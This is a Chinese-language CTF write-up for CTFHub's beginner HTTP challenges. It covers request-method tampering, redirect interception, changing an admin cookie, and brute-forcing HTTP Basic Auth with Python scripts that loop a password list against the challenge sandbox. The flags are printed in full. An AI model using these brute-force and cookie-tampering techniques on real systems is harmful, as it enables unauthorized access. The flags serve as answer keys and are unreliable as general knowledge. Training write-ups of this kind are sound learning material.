---
description: Web技能树·前置技能·HTTP协议
---

# 技能树·HTTP协议

![image-20210424132445332](https://gitee.com/Harveysn0w/mac-note_img/raw/master/20210424132445.png)

## 1、请求方式

![image-20210424132802101](https://gitee.com/Harveysn0w/mac-note_img/raw/master/20210424132802.png)

![image-20210424133807305](https://gitee.com/Harveysn0w/mac-note_img/raw/master/20210424133807.png)

用hackbar怎么都不管用，get，post都不行，仔细一看应该是把GET请求方式改成GTFHUB的请求方式，可是HTTP没有这种方式呀，就抓包一试。

![image-20210424133453625](https://gitee.com/Harveysn0w/mac-note_img/raw/master/20210424133453.png)

![image-20210424133517245](https://gitee.com/Harveysn0w/mac-note_img/raw/master/20210424133517.png)

修改之后，放包，flag出现~

![image-20210424133526536](https://gitee.com/Harveysn0w/mac-note_img/raw/master/20210424133526.png)

```text
ctfhub{c483838cbe2f37579f65800c}
```

### HTTP的请求方式

```text
1、OPTIONS
返回服务器针对特定资源所支持的HTTP请求方法，也可以利用向web服务器发送‘*’的请求来测试服务器的功能性
2、HEAD
向服务器索与GET请求相一致的响应，只不过响应体将不会被返回。这一方法可以再不必传输整个响应内容的情况下，就可以获取包含在响应小消息头中的元信息。
3、GET
向特定的资源发出请求。注意：GET方法不应当被用于产生“副作用”的操作中，例如在Web Application中，其中一个原因是GET可能会被网络蜘蛛等随意访问。Loadrunner中对应get请求函数：web_link和web_url
4、POST
向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。 Loadrunner中对应POST请求函数：web_submit_data,web_submit_form
5、PUT
向指定资源位置上传其最新内容
6、DELETE
请求服务器删除Request-URL所标识的资源
7、TRACE
回显服务器收到的请求，主要用于测试或诊断
8、CONNECT
HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。

注意：
1）方法名称是区分大小写的，当某个请求所针对的资源不支持对应的请求方法的时候，服务器应当返回状态码405（Mothod Not Allowed）；当服务器不认识或者不支持对应的请求方法时，应返回状态码501（Not Implemented）。
2）HTTP服务器至少应该实现GET和HEAD/POST方法，其他方法都是可选的，此外除上述方法，特定的HTTP服务器支持扩展自定义的方法。
```

## 2、302跳转

![image-20210424134238786](https://gitee.com/Harveysn0w/mac-note_img/raw/master/20210424134238.png)

![image-20210424134310310](https://gitee.com/Harveysn0w/mac-note_img/raw/master/20210424134310.png)

点击Give me flag链接，进行抓包获得flag

![image-20210424134419749](https://gitee.com/Harveysn0w/mac-note_img/raw/master/20210424134419.png)

```text
ctfhub{7bb4b24e346c4f1108a97d13}
```

## 3、Cookie

![image-20210424134530517](https://gitee.com/Harveysn0w/mac-note_img/raw/master/20210424134530.png)

![image-20210424134836789](https://gitee.com/Harveysn0w/mac-note_img/raw/master/20210424134836.png)

题目说是admin才给flag，抓包看到cookie中的admin值为0，所以需要修改成1。

![image-20210424134707126](https://gitee.com/Harveysn0w/mac-note_img/raw/master/20210424134707.png)

放包得到flag

![image-20210424134723578](https://gitee.com/Harveysn0w/mac-note_img/raw/master/20210424134723.png)

```text
ctfhub{f2d68b2b26f3dad8429e36ea}
```

## 4、基础认证

![image-20210424134908729](https://gitee.com/Harveysn0w/mac-note_img/raw/master/20210424134908.png)

![image-20210424135004621](https://gitee.com/Harveysn0w/mac-note_img/raw/master/20210424135004.png)

点击click，需要我们输入账号密码

![image-20210424135025990](https://gitee.com/Harveysn0w/mac-note_img/raw/master/20210424135026.png)

我们尝试登录一下，没有什么效果。题目附件给了一份密码，也就是说密码在其中。我们抓包看了一下，密码是base64加密的。

![image-20210424140719559](https://gitee.com/Harveysn0w/mac-note_img/raw/master/20210424140719.png)

我们使用一个脚本，将密码进行加密。

```text
import base64

with open("10_million_password_list_top_100.txt", "r+") as f:
    for line in f.readlines():
        line = line.strip('\n')
        line = 'admin:'+line
        print (line)
        line1=base64.b64encode(line.encode('utf-8'))
        #print(str(line1,'utf-8'))
        f.write(str(line1,'utf-8')+'\n')
```

![image-20210424140355959](https://gitee.com/Harveysn0w/mac-note_img/raw/master/20210424140355.png)

我们进行整理一下。方便导入burp进行爆破

![image-20210424140846852](https://gitee.com/Harveysn0w/mac-note_img/raw/master/20210424140846.png)

成功得到flag

```text
ctfhub{f75a627405e265fcb4cfe479}
```

### 基础认证

```text
https://zh.wikipedia.org/wiki/HTTP%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%81
```

### 其余解法

python中requests模块提供了对应的方法可以用来对账号密码进行爆破。

打开题目抓包，点击click获取flag，弹框需要账号密码，随便输入账号密码，已知账号admin,题干下面提供了密码的字典，直接上python脚本走一波。

方法一：利用python中requests模块的auth.HTTPBasicAuth爆破

```text
import requests
proxies={"http:http://127.0.0.1:5080"}
username='admin'
with open(r'10_million_password_list_top_100.txt','r') as f:
    lines=f.readlines()
    for pwd in lines:
        password=pwd.rstrip('\n')
        url = "http://challenge-537d355a9df61d39.sandbox.ctfhub.com:10080/flag.html"
        auth=requests.auth.HTTPBasicAuth(username,password)
        print(auth)
        res=requests.get(url=url,auth=auth)
        ss=res.status_code
        if ss==200:
            print("password is %s,status_code is %s" %(password,ss))
```

通过requests模块，该模块提供了http基础认证的方法，直接爆破密码，根据返回值为200则密码正确，否则返回值为401，密码错误。

方法二：通过浏览器可以用[http://username:password@domain的方式进行登陆验证](http://username:password@domain的方式进行登陆验证)

```text
import requests
username='admin'
with open(r'10_million_password_list_top_100.txt','r') as f:
    lines=f.readlines()
    for pwd in lines:
        password=pwd.rstrip('\n')
        url = "http://admin:%s@challenge-da462e6a1d7f1d65.sandbox.ctfhub.com:10080/flag.html" %password     
        res=requests.get(url=url)
        ss=res.status_code
        # if ss==200:
        print("password is %s,status_code is %s" %(password,ss))
```

方法三：burp时候添加base64编码以及admin头部

![image-20210424141519835](https://gitee.com/Harveysn0w/mac-note_img/raw/master/20210424141519.png)

![image-20210424141532019](https://gitee.com/Harveysn0w/mac-note_img/raw/master/20210424141532.png)

![image-20210424141554820](https://gitee.com/Harveysn0w/mac-note_img/raw/master/20210424141554.png)

## 5、响应包源代码

![image-20210424141750890](https://gitee.com/Harveysn0w/mac-note_img/raw/master/20210424141750.png)

![image-20210424141900070](https://gitee.com/Harveysn0w/mac-note_img/raw/master/20210424141900.png)

f12查看源码，flag出来。

![image-20210424141918803](https://gitee.com/Harveysn0w/mac-note_img/raw/master/20210424141918.png)

```text
ctfhub{c42e7e2fd33560b0043b5629}
```

